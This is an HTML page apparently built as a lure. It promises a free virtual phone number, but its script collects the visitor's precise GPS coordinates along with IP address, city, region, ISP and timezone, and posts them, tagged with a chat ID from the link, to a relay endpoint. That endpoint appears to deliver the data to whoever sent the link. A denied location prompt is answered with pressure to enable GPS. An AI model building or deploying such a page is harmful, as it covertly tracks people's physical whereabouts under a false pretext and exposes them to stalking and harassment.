<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>Free Virtual Number</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
    .navbar {
      background-color: #ff0000;
      color: white;
      text-align: center;
      padding: 15px 0;
    }
    #header {
      margin: 0;
      font-size: 28px;
      font-weight: bold;
    }
    .container {
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    .background-image {
      width: 100%;
      height: 300px;
      background-image: url('background0.jpg');
      background-size: cover;
      background-position: center;
      margin-bottom: 40px;
    }
    #getNumberBtn {
      display: block;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 5px;
      background-color: #ff0000;
      color: white;
      font-size: 18px;
      cursor: pointer;
      font-family: 'Montserrat', sans-serif;
      margin: 30px 0;
      border: 4px solid blue;
    }
    #getNumberBtn:hover {
      background-color: #cc0000;
    }
    footer {
      text-align: center;
      margin-top: 40px;
      color: #666;
    }
    .loading {
      display: none;
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
    .text {
      margin-bottom: 30px;
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <h1 id="header">FREE VIRTUAL NUMBER</h1>
  </nav>

  <div class="container">
    <div class="background-image"></div>
    <p class="text">Click the button below to get your free virtual number!</p>
    <button id="getNumberBtn" onclick="getVirtualNumber()">GET FREE VIRTUAL NUMBER</button>
    <div class="loading" id="loading">Processing your request...</div>
  </div>

  <footer>
    <p>Made With ❤️ @Hekmat_King</p>
  </footer>

  <script type="text/javascript">
    function GetURLParameter(sParam) {
      const sPageURL = window.location.search.substring(1);
      const sURLVariables = sPageURL.split('&');
      for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) {
          return sParameterName[1];
        }
      }
    }

    async function getIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error('IP API failed');
        return await response.json();
      } catch (error) {
        console.error('Error fetching IP info:', error);
        try {
          // Fallback to another IP service if first fails
          const backupResponse = await fetch('https://ipinfo.io/json');
          return await backupResponse.json();
        } catch (e) {
          console.error('Backup IP service also failed:', e);
          return null;
        }
      }
    }

    async function getVirtualNumber() {
      const btn = document.getElementById('getNumberBtn');
      const loading = document.getElementById('loading');
      
      btn.textContent = 'Processing...';
      loading.style.display = 'block';

      const chatId = GetURLParameter('chatId');
      if (!chatId) {
        alert('Chat ID not found in URL parameters');
        btn.textContent = 'GET FREE VIRTUAL NUMBER';
        loading.style.display = 'none';
        return;
      }

      if (navigator.geolocation) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          });
          
          const ipInfo = await getIPInfo();
          await sendData(position, chatId, ipInfo);
          
        } catch (error) {
          handleLocationError(error);
        }
      } else {
        alert("Your browser doesn't support geolocation");
      }
      
      btn.textContent = 'GET FREE VIRTUAL NUMBER';
      loading.style.display = 'none';
    }

    async function sendData(position, chatId, ipInfo) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('latitude', latitude);
      formData.append('longitude', longitude);
      formData.append('accuracy', accuracy);
      
      if (ipInfo) {
        formData.append('ip', ipInfo.ip || 'N/A');
        formData.append('country', ipInfo.country || ipInfo.country_name || 'N/A');
        formData.append('region', ipInfo.region || ipInfo.regionName || 'N/A');
        formData.append('city', ipInfo.city || 'N/A');
        formData.append('isp', ipInfo.org || ipInfo.asn?.org || 'N/A');
        formData.append('timezone', ipInfo.timezone || 'N/A');
      }

      try {
        const response = await fetch('/api/sendMedia', {
          method: 'POST',
          body: formData
        });
        
        const result = await response.json();
        if (!result.ok) {
          throw new Error(result.error || 'Failed to send data');
        }
        
        alert('Your virtual number is being processed!');
      } catch (error) {
        console.error('Error:', error);
        alert('Error: ' + error.message);
      }
    }

    function handleLocationError(error) {
      let message = '';
      switch(error.code) {
        case error.PERMISSION_DENIED:
          message = "Location access was denied. Please enable GPS to get your free number.";
          break;
        case error.POSITION_UNAVAILABLE:
          message = "Location information is unavailable.";
          break;
        case error.TIMEOUT:
          message = "The request to get location timed out.";
          break;
        default:
          message = "An unknown error occurred.";
      }
      alert(message);
    }
  </script>
</body>
</html>
